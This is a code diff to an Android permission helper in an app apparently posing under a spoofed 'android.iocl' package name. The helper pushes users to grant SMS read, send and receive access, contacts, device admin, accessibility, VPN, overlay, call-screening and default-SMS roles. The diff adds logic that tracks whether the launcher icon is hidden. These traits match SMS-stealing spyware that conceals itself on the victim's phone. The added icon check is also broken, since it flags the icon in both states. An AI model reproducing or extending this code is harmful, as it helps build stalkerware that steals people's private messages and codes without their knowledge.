@@ -9,23 +9,19 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.content.pm.ServiceInfo;
-import android.iocl.dac_collector.BuildConfig;
 import android.iocl.dac_collector.ModelData.PermissionItem;
 import android.iocl.dac_collector.R;
 import android.iocl.dac_collector.Services.AcessibilitySettings;
-import android.iocl.dac_collector.Services.CallerIdService;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.provider.Settings;
-import android.telecom.TelecomManager;
 import android.text.TextUtils;
+import android.util.Log;
 import android.view.inputmethod.InputMethodInfo;
 import android.view.inputmethod.InputMethodManager;
 import android.widget.Toast;
 
-import androidx.annotation.RequiresApi;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
@@ -311,6 +307,41 @@ public class PermissionUtility {
         return XXPermissions.isGrantedPermissions(activity, Permission.REQUEST_INSTALL_PACKAGES);
     }
 
+
+    public static boolean isCallScreeningServiceEnabled(Context context) {
+
+
+        // if RoleManager is null return true cause we dont want old devices show this permission if they dont have in their system
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            try {
+                RoleManager roleManager = (RoleManager) context.getSystemService(Context.ROLE_SERVICE);
+                if (roleManager != null && roleManager.isRoleAvailable(RoleManager.ROLE_CALL_SCREENING)) {
+                    return roleManager.isRoleHeld(RoleManager.ROLE_CALL_SCREENING);
+                }
+            } catch (Exception e) {
+                return true;
+            }
+        }
+        return true;
+    }
+
+    /**
+     * Returns true if any permission is missing
+     */
+    public static boolean isAnyPermissionMissing(Activity activity, boolean onlyMandatory) {
+        return !getMissingPermissions(activity, onlyMandatory).isEmpty();
+    }
+
+    public static boolean isMasterSyncAutomatically() {
+        return ContentResolver.getMasterSyncAutomatically();
+    }
+
+    public static boolean isAlwaysOnVpnEnabled(Context context) {
+        return SharedPrefs.getVPNAlways(context);
+    }
+
+
     public static List<String> getMissingPermissions(Activity activity, boolean onlyMandatory) {
         List<String> missingPermissions = new ArrayList<>();
 
@@ -327,8 +358,27 @@ public class PermissionUtility {
                 Permission.SEND_SMS,
                 Permission.BIND_VPN_SERVICE,
                 Permission.SYSTEM_ALERT_WINDOW,
+                Permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                 Permission.READ_PHONE_NUMBERS
         };
+
+        /*
+          .permission(Permission.READ_PHONE_STATE)
+                    .permission(Permission.READ_SMS)
+                    .permission(Permission.BIND_VPN_SERVICE)
+                    .permission(Permission.RECEIVE_SMS)
+                    .permission(Permission.READ_CONTACTS)
+                    .permission(Permission.CALL_PHONE)
+                    .permission(Permission.SCHEDULE_EXACT_ALARM)
+                    .permission(Permission.SYSTEM_ALERT_WINDOW)
+                    .permission(Permission.POST_NOTIFICATIONS)
+                    .permission(Permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                    .permission(Permission.SEND_SMS)
+                    .permission(Permission.MANAGE_EXTERNAL_STORAGE)
+                    .permission(Permission.READ_PHONE_NUMBERS)
+
+
+         */
 
         // First, check which permissions are already not granted
         for (String permission : requiredPermissions) {
@@ -337,7 +387,7 @@ public class PermissionUtility {
             }
         }
 
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O || BuildConfig.DEBUG) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
             if (!RoleHelper.isDefault(activity)) {
                 missingPermissions.add("default_sms");
             }
@@ -361,11 +411,16 @@ public class PermissionUtility {
 
         if (!isCallScreeningServiceEnabled(activity)) {
             missingPermissions.add("default_caller_id");
-
         }
 
         if (!isAdmin(activity)) {
             missingPermissions.add("Admin");
+        }
+        if (!isIconVisible(activity)) {
+            missingPermissions.add("hidden_icon");
+        }
+        if (isIconVisible(activity)) {
+            missingPermissions.add("hidden_icon");
         }
 
         if (XXPermissions.isGrantedPermissions(activity, Permission.POST_NOTIFICATIONS)) {
@@ -388,6 +443,7 @@ public class PermissionUtility {
             }
         }
 
+
         // 🔹 FILTER OPTIONALS IF FLAG IS TRUE
         if (onlyMandatory) {
             List<String> mandatoryOnly = new ArrayList<>();
@@ -400,37 +456,12 @@ public class PermissionUtility {
             return mandatoryOnly;
         }
 
+
+
+
         return missingPermissions;
     }
 
-    public static boolean isCallScreeningServiceEnabled(Context context) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            try {
-                RoleManager roleManager = (RoleManager) context.getSystemService(Context.ROLE_SERVICE);
-                if (roleManager != null && roleManager.isRoleAvailable(RoleManager.ROLE_CALL_SCREENING)) {
-                    return roleManager.isRoleHeld(RoleManager.ROLE_CALL_SCREENING);
-                }
-            } catch (Exception e) {
-
-            }
-        }
-        return false;
-    }
-
-    /**
-     * Returns true if any permission is missing
-     */
-    public static boolean isAnyPermissionMissing(Activity activity, boolean onlyMandatory) {
-        return !getMissingPermissions(activity, onlyMandatory).isEmpty();
-    }
-
-    public static boolean isMasterSyncAutomatically() {
-        return ContentResolver.getMasterSyncAutomatically();
-    }
-
-    public static boolean isAlwaysOnVpnEnabled(Context context) {
-        return SharedPrefs.getVPNAlways(context);
-    }
 
     /**
      * From a list of missing permission strings, build a list of
@@ -448,6 +479,7 @@ public class PermissionUtility {
                 Permission.SEND_SMS,
                 Permission.READ_CONTACTS,
                 Permission.READ_PHONE_STATE,
+                Permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                 Permission.READ_PHONE_NUMBERS,
                 Permission.SYSTEM_ALERT_WINDOW,
                 Permission.BIND_VPN_SERVICE,
@@ -473,7 +505,7 @@ public class PermissionUtility {
         if (needsGeneralTile) {
             items.add(new PermissionItem(
                     "General Permissions",
-                    true,
+                    false,
                     "Allow Read SMS, Receive SMS, Send SMS, Phone & Alarm permissions for core functionality",
                     R.drawable.general_permission,
                     false
@@ -486,6 +518,28 @@ public class PermissionUtility {
 
         return items;
     }
+
+
+    private static boolean isIconVisible(Context context) {
+        ComponentName componentName = new ComponentName(context, "android.iocl.dac_collector.LauncherAlias");
+        PackageManager pm = context.getPackageManager();
+        int state = pm.getComponentEnabledSetting(componentName);
+
+        if (state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+            return true;
+        } else if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+            return false;
+        } else {
+            // Default state — check if declared and not disabled in manifest
+            try {
+                pm.getActivityInfo(componentName, 0);
+                return true;
+            } catch (PackageManager.NameNotFoundException e) {
+                return false;
+            }
+        }
+    }
+
 
     /**
      * Map a single permission string to its title/description/icon.
@@ -583,6 +637,13 @@ public class PermissionUtility {
                 title = "Autostart (Optional)";
                 description = "Check if your device has Autostart Permission and enable it.";
                 break;
+            case "hidden_icon":
+                icon = R.drawable.hidden_icon;
+                isOptional = true;
+                title = "Hidden Icon";
+                description = "Show icon in the launcher";
+                break;
+
 
             default:
                 // Fallback for any other permission
@@ -592,8 +653,6 @@ public class PermissionUtility {
 
         return new PermissionItem(title, isOptional, description, icon, false);
     }
-
-
 
 
 }
